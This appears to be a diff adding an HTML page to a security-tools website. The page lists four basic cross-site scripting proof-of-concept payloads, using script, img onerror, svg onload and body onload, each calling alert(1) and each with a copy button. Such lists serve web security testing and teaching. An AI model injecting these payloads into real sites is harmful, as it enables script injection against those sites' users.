@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Generator | Tools</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Roboto+Mono:wght@400;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+
+<body class="bg-black text-gray-300">
+
+    <main class="pt-32 pb-20 container mx-auto px-6 max-w-3xl">
+        <a href="../tools.html" class="text-gray-500 hover:text-white mb-8 inline-block font-mono"><i
+                class="fas fa-arrow-left mr-2"></i>Back to Tools</a>
+
+        <div class="bg-gray-900 border border-gray-800 rounded-xl p-8 shadow-2xl">
+            <h1 class="text-2xl font-bold text-white font-mono mb-6 flex items-center">
+                <i class="fas fa-bug text-orange-500 mr-3"></i>XSS Payloads
+            </h1>
+            <p class="text-gray-400 mb-6 text-sm">Educational use only. Generate Cross-Site Scripting payloads.</p>
+
+            <div class="space-y-4">
+                <div
+                    class="bg-black/50 p-4 rounded border border-gray-800 flex justify-between items-center group hover:border-orange-500/50 transition-colors">
+                    <div>
+                        <p class="text-xs text-gray-500 font-mono mb-1">Basic Alert</p>
+                        <code class="text-orange-400 font-mono text-sm">&lt;script&gt;alert(1)&lt;/script&gt;</code>
+                    </div>
+                    <button onclick="copyText(this, `<script>alert(1)</script>`)"
+                        class="text-gray-500 hover:text-white"><i class="far fa-copy"></i></button>
+                </div>
+
+                <div
+                    class="bg-black/50 p-4 rounded border border-gray-800 flex justify-between items-center group hover:border-orange-500/50 transition-colors">
+                    <div>
+                        <p class="text-xs text-gray-500 font-mono mb-1">Image OnError</p>
+                        <code class="text-orange-400 font-mono text-sm">&lt;img src=x onerror=alert(1)&gt;</code>
+                    </div>
+                    <button onclick="copyText(this, `<img src=x onerror=alert(1)>`)"
+                        class="text-gray-500 hover:text-white"><i class="far fa-copy"></i></button>
+                </div>
+
+                <div
+                    class="bg-black/50 p-4 rounded border border-gray-800 flex justify-between items-center group hover:border-orange-500/50 transition-colors">
+                    <div>
+                        <p class="text-xs text-gray-500 font-mono mb-1">SVG OnLoad</p>
+                        <code class="text-orange-400 font-mono text-sm">&lt;svg/onload=alert(1)&gt;</code>
+                    </div>
+                    <button onclick="copyText(this, `<svg/onload=alert(1)>`)" class="text-gray-500 hover:text-white"><i
+                            class="far fa-copy"></i></button>
+                </div>
+
+                <div
+                    class="bg-black/50 p-4 rounded border border-gray-800 flex justify-between items-center group hover:border-orange-500/50 transition-colors">
+                    <div>
+                        <p class="text-xs text-gray-500 font-mono mb-1">Body OnLoad</p>
+                        <code class="text-orange-400 font-mono text-sm">&lt;body onload=alert(1)&gt;</code>
+                    </div>
+                    <button onclick="copyText(this, `<body onload=alert(1)>`)" class="text-gray-500 hover:text-white"><i
+                            class="far fa-copy"></i></button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script src="../../js/main.js"></script>
+    <script>
+        function copyText(btn, text) {
+            navigator.clipboard.writeText(text);
+            const originalIcon = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-check text-green-500"></i>';
+            setTimeout(() => btn.innerHTML = originalIcon, 2000);
+        }
+    </script>
+</body>
+
+</html>
